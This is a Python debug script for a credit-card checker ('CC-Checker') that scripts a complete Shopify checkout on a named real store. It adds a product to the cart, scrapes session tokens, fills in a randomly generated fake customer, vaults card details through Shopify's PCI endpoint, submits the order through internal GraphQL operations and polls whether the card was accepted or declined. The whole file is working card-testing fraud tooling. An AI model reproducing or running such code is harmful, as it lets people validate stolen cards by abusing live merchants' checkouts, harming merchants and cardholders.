
import asyncio
import json
import logging
import sys
import aiohttp
from aiohttp import CookieJar

sys.path.insert(0, '.')
from core.parser import CardData
from gateways.shopify_gate import _generate_random_customer, _extract_meta, _extract_unique_id, _gql, BROWSER_HEADERS, DEFAULT_STORES

# Configure root logger to output everything to stdout
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s | %(levelname)s | %(name)s | %(message)s")
logger = logging.getLogger("CC-Checker.ShopifyDebug")

async def test_raw_shopify_flow():
    # 1. Prepare test card data (Using standard test Visa card)
    card = CardData(number="4111111111111111", month="12", year="27", cvv="123")
    
    # 2. Use confirmed working store (brio4life.com)
    store = DEFAULT_STORES[0]
    base_url = store["base_url"]
    variant_id = store["variant_id"]
    pay_method_id = store["payment_method_id"]
    sf_ep = f"{base_url}/api/2024-01/graphql.json"
    
    customer = _generate_random_customer()
    
    print("\n" + "="*80)
    print(f"🚀 STARTING RAW CHECKOUT TEST ON: {base_url}")
    print("="*80 + "\n")
    
    jar = CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        
        # ── Step 1: Add to Cart ───────────────────────────────────────────────
        print("📥 [STEP 1] Adding product variant to cart...")
        async with session.post(
            f"{base_url}/cart/add.js",
            data=f"id={variant_id}&quantity=1",
            headers={**BROWSER_HEADERS,
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Accept": "application/json",
                     "X-Requested-With": "XMLHttpRequest",
                     "Referer": base_url + "/"}
        ) as r:
            cart_txt = await r.text()
            print(f"   HTTP Status: {r.status}")
            print(f"   Response Preview: {cart_txt[:200]}")
            if r.status not in (200, 201):
                print("❌ Cart addition failed. Exiting.")
                return

        # ── Step 2: Load Checkout Page ────────────────────────────────────────
        print("\n📄 [STEP 2] Loading checkout page to extract tokens...")
        # Pyrogram uses curl_cffi, but since we are debugging raw HTTP response codes,
        # we will fetch via aiohttp (which works if no cloudflare block)
        async with session.get(
            f"{base_url}/checkout?locale=en",
            headers={**BROWSER_HEADERS, "Accept": "text/html", "Referer": base_url + "/"}
        ) as r:
            html = await r.text()
            checkout_url = str(r.url)
            print(f"   HTTP Status: {r.status} | Final URL: {checkout_url}")
            
        session_token = _extract_meta(html, "sessionToken")
        checkout_id = _extract_meta(html, "sourceToken")
        unique_id = _extract_unique_id(html)
        
        print(f"   sessionToken (length): {len(session_token) if session_token else 'MISSING'}")
        print(f"   checkout_id: {checkout_id}")
        print(f"   unique_id: {unique_id}")
        
        if not session_token or not checkout_id:
            print("❌ Failed to extract sessionToken or checkout_id. Exiting.")
            return

        # ── Step 3: Fetch Shipping Rate Handle ───────────────────────────────
        print("\n🚚 [STEP 3] Fetching shipping/delivery rate handle...")
        # Setup cart buyer identity
        cart_token = ""
        for cookie in session.cookie_jar:
            if cookie.key == "cart":
                import urllib.parse as _urlparse
                val = _urlparse.unquote(cookie.value)
                if "?key=" in val:
                    cart_token = val
        
        cart_gid = f"gid://shopify/Cart/{cart_token}" if cart_token else ""
        print(f"   Cart GID: {cart_gid}")
        
        delivery_handle = ""
        if cart_gid:
            # Query storefront API for rates
            _, d2 = await _gql(session, sf_ep, """
mutation cartBuyerIdentityUpdate($cartId: ID!, $buyerIdentity: CartBuyerIdentityInput!) {
  cartBuyerIdentityUpdate(cartId: $cartId, buyerIdentity: $buyerIdentity) {
    cart {
      deliveryGroups(first: 5) {
        nodes {
          deliveryOptions { handle title code }
        }
      }
    }
  }
}""", {
                "cartId": cart_gid,
                "buyerIdentity": {
                    "email": customer["email"],
                    "countryCode": "US",
                    "deliveryAddressPreferences": [{
                        "deliveryAddress": {
                            "firstName": customer["firstName"],
                            "lastName": customer["lastName"],
                            "address1": customer["address1"],
                            "city": customer["city"],
                            "province": customer["state"],
                            "zip": customer["zip"],
                            "country": "US"
                        }
                    }]
                }
            }, headers={"Accept": "application/json", "Content-Type": "application/json"})
            
            nodes = (((d2.get("data") or {}).get("cartBuyerIdentityUpdate") or {})
                     .get("cart", {}).get("deliveryGroups", {}).get("nodes") or [])
            if nodes:
                opts = nodes[0].get("deliveryOptions") or []
                if opts:
                    rate_handle = opts[0].get("handle", "")
                    if unique_id and rate_handle:
                        delivery_handle = f"{unique_id}-{rate_handle}"
                    else:
                        delivery_handle = rate_handle
        
        print(f"   delivery_handle: {delivery_handle}")
        if not delivery_handle:
            print("❌ Shipping rate handle is empty. Exiting.")
            return

        # ── Step 4: Vault Credit Card to Shopify PCI ──────────────────────────
        print("\n💳 [STEP 4] Vaulting credit card details...")
        async with session.post(
            "https://checkout.pci.shopifyinc.com/sessions",
            json={
                "credit_card": {
                    "number": card.number,
                    "name": f"{customer['firstName']} {customer['lastName']}",
                    "month": int(card.month),
                    "year": int("20" + card.year),
                    "verification_value": card.cvv
                }
            },
            headers={"Accept": "application/json", "Content-Type": "application/json"}
        ) as r:
            vault_data = await r.json()
            vault_id = vault_data.get("id")
            print(f"   HTTP Status: {r.status}")
            print(f"   Vault Session ID: {vault_id}")
            if not vault_id:
                print(f"❌ Card vaulting failed. Response: {vault_data}")
                return

        # ── Step 5: Submit checkout for Completion ────────────────────────────
        print("\n📤 [STEP 5] Submitting checkout (SubmitForCompletion)...")
        internal_ep = f"{base_url}/checkouts/internal/graphql/persisted"
        
        submit_payload = {
            "variables": {
                "input": {
                    "delivery": {
                        "deliveryLines": [{
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_handle
                                }
                            }
                        }]
                    },
                    "payment": {
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": pay_method_id,
                                    "paymentSessionId": vault_id
                                }
                            }
                        }]
                    },
                    "sessionToken": session_token
                }
            },
            "operationName": "SubmitForCompletion",
            "id": "d175350fa2abc713b3171bd7eee3d6443861a7c884298fde2bea9d60abbebcf6"
        }
        
        internal_headers = {
            **BROWSER_HEADERS,
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Referer": checkout_url
        }
        
        async with session.post(
            internal_ep,
            params={"operationName": "SubmitForCompletion"},
            json=submit_payload,
            headers=internal_headers
        ) as r:
            submit_res = await r.json()
            print(f"   HTTP Status: {r.status}")
            print("   RAW SUBMIT RESPONSE JSON:")
            print(json.dumps(submit_res, indent=2))
            
        data = submit_res.get("data", {}) or {}
        comp = data.get("submitForCompletion", {}) or {}
        typename = comp.get("__typename", "")
        receipt_id = comp.get("receiptId") or (comp.get("receipt") or {}).get("id")
        
        print(f"   __typename: {typename}")
        print(f"   receipt_id: {receipt_id}")
        
        if typename == "SubmitRejected":
            print("❌ Submission was rejected before payment could be initiated.")
            return

        if not receipt_id:
            print("❌ No receipt_id received. Cannot poll gateway.")
            return

        # ── Step 6: Poll for Gateway Receipt ──────────────────────────────────
        print("\n⏳ [STEP 6] Polling gateway receipt...")
        poll_payload = {
            "variables": {
                "receiptId": receipt_id,
                "sessionToken": session_token
            },
            "operationName": "PollForReceipt",
            "id": "cb31a1b2197416d7441bf789defc306069c385c558764a58648f18cba899a29a"
        }
        
        for attempt in range(1, 6):
            await asyncio.sleep(1.5)
            async with session.post(
                internal_ep,
                params={"operationName": "PollForReceipt"},
                json=poll_payload,
                headers=internal_headers
            ) as r:
                poll_res = await r.json()
                print(f"\n   --- Poll Attempt {attempt} ---")
                print("   RAW POLL RESPONSE JSON:")
                print(json.dumps(poll_res, indent=2))
                
                receipt = (poll_res.get("data") or {}).get("receipt", {}) or {}
                rec_type = receipt.get("__typename")
                print(f"   Receipt Typename: {rec_type}")
                
                if rec_type == "ProcessedReceipt":
                    print("✅ CHECKOUT SUCCESSFUL! Response reached card carrier.")
                    break
                elif rec_type == "FailedReceipt":
                    print("❌ CHECKOUT FAILED! Gateway rejected transaction.")
                    break

if __name__ == "__main__":
    asyncio.run(test_raw_shopify_flow())
